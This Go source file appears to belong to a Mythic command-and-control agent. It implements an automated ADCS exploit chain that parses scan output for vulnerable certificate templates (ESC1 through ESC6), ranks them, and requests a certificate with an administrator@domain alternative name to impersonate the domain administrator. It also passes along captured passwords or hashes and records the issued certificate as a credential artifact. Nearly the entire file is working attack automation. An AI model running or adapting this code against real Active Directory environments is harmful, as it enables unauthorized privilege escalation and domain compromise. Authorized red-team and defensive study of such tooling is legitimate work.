package agentfunctions

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// adcsFindDone is the completion function for the auto-exploit chain's find subtask.
// It parses the find output for vulnerable templates and creates a request subtask
// targeting the most exploitable template found.
func adcsFindDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Get find output
	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" || subtaskData.Task.Status != "success" {
		completed := true
		response.Completed = &completed
		msg := "ADCS auto-exploit: find subtask failed or returned empty results"
		response.Stdout = &msg
		return response
	}

	// Parse chain context from parent task
	var chainCtx map[string]interface{}
	if taskData.Task.Stdout != "" {
		json.Unmarshal([]byte(taskData.Task.Stdout), &chainCtx)
	}
	if chainCtx == nil {
		completed := true
		response.Completed = &completed
		msg := "ADCS auto-exploit: chain context lost"
		response.Stdout = &msg
		return response
	}

	// Parse vulnerable templates from find output
	type vulnTemplate struct {
		name    string
		caName  string
		escType string
	}

	var vulns []vulnTemplate
	lines := strings.Split(responseText, "\n")
	templateRe := regexp.MustCompile(`\[!\]\s+(\S+)\s+\(CA:\s+([^)]+)\)`)
	for i, line := range lines {
		matches := templateRe.FindStringSubmatch(line)
		if matches == nil {
			continue
		}
		templateName := matches[1]
		caName := matches[2]

		escType := ""
		for j := i + 1; j < len(lines) && j < i+5; j++ {
			trimmed := strings.TrimSpace(lines[j])
			if strings.HasPrefix(trimmed, "ESC1") {
				escType = "ESC1"
				break
			} else if strings.HasPrefix(trimmed, "ESC6") {
				escType = "ESC6"
				break
			} else if strings.HasPrefix(trimmed, "ESC4") {
				escType = "ESC4"
				break
			} else if strings.HasPrefix(trimmed, "ESC2") {
				escType = "ESC2"
				break
			} else if strings.HasPrefix(trimmed, "ESC3") {
				escType = "ESC3"
				break
			}
			if strings.HasPrefix(trimmed, "[") {
				break
			}
		}
		if escType != "" {
			vulns = append(vulns, vulnTemplate{name: templateName, caName: caName, escType: escType})
		}
	}

	// Also check for ESC6 at CA level
	esc6CA := ""
	for _, line := range lines {
		if strings.Contains(line, "ESC6 VULNERABLE") {
			parts := strings.SplitN(strings.TrimSpace(line), ":", 2)
			if len(parts) > 0 {
				esc6CA = strings.TrimSpace(parts[0])
			}
		}
	}

	if len(vulns) == 0 {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("ADCS auto-exploit: no exploitable templates found.\n\nFind output:\n%s", truncateString(responseText, 500))
		response.Stdout = &msg
		return response
	}

	// Pick the best vulnerability (ESC1 > ESC6 > ESC4 > ESC2 > ESC3)
	priority := map[string]int{"ESC1": 1, "ESC6": 2, "ESC4": 3, "ESC2": 4, "ESC3": 5}
	best := vulns[0]
	for _, v := range vulns[1:] {
		if priority[v.escType] < priority[best.escType] {
			best = v
		}
	}

	// Build request params
	server := ""
	if s, ok := chainCtx["server"].(string); ok {
		server = s
	}
	username := ""
	if u, ok := chainCtx["username"].(string); ok {
		username = u
	}
	password := ""
	if p, ok := chainCtx["password"].(string); ok {
		password = p
	}
	hash := ""
	if h, ok := chainCtx["hash"].(string); ok {
		hash = h
	}

	reqParams := map[string]interface{}{
		"action":   "request",
		"server":   server,
		"ca_name":  best.caName,
		"template": best.name,
		"username": username,
		"password": password,
		"hash":     hash,
		"timeout":  30,
	}

	// For ESC1/ESC6, request with SAN for impersonation
	if best.escType == "ESC1" || (best.escType == "ESC6" && esc6CA == best.caName) {
		domain := ""
		if d, ok := chainCtx["domain"].(string); ok {
			domain = d
		}
		if domain == "" && username != "" {
			if strings.Contains(username, "@") {
				parts := strings.SplitN(username, "@", 2)
				domain = parts[1]
			} else if strings.Contains(username, "\\") {
				parts := strings.SplitN(username, "\\", 2)
				domain = parts[0]
			}
		}
		if domain != "" {
			reqParams["alt_name"] = "administrator@" + strings.ToLower(domain)
		}
	}

	reqJSON, _ := json.Marshal(reqParams)

	msg := fmt.Sprintf("ADCS auto-exploit: found %d vulnerable templates.\nBest target: %s (CA: %s, %s)\nProceeding with certificate request...",
		len(vulns), best.name, best.caName, best.escType)
	response.Stdout = &msg

	callbackFunc := "adcsExploitDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(mythicrpc.MythicRPCTaskCreateSubtaskMessage{
		TaskID:                  taskData.Task.ID,
		SubtaskCallbackFunction: &callbackFunc,
		CommandName:             "adcs",
		Params:                  string(reqJSON),
	})
	if err != nil {
		logging.LogError(err, "Failed to create ADCS request subtask")
		completed := true
		response.Completed = &completed
		errMsg := fmt.Sprintf("Auto-exploit: found %s but failed to create request subtask: %v", best.escType, err)
		response.Stdout = &errMsg
	}

	return response
}

// adcsExploitDone is the completion function for the auto-exploit chain's request subtask.
func adcsExploitDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	completed := true
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:    taskData.Task.ID,
		Success:   true,
		Completed: &completed,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	status := subtaskData.Task.Status

	var summary string
	if status == "success" && strings.Contains(responseText, "ISSUED") {
		summary = fmt.Sprintf("=== ADCS Auto-Exploit SUCCESSFUL ===\nCertificate ISSUED!\n\n%s", truncateString(responseText, 1000))

		tagTask(taskData.Task.ID, "ADCS-EXPLOIT",
			"Auto-exploit chain: vulnerable template exploited, certificate issued")

		mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
			TaskID:           taskData.Task.ID,
			BaseArtifactType: "Credential",
			ArtifactMessage:  "ADCS auto-exploit: certificate issued via vulnerable template",
		})
	} else {
		summary = fmt.Sprintf("=== ADCS Auto-Exploit Chain Complete ===\nRequest status: %s\n\n%s", status, truncateString(responseText, 500))
	}

	response.Stdout = &summary
	return response
}

// truncateString truncates a string to maxLen, adding "..." if truncated.
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
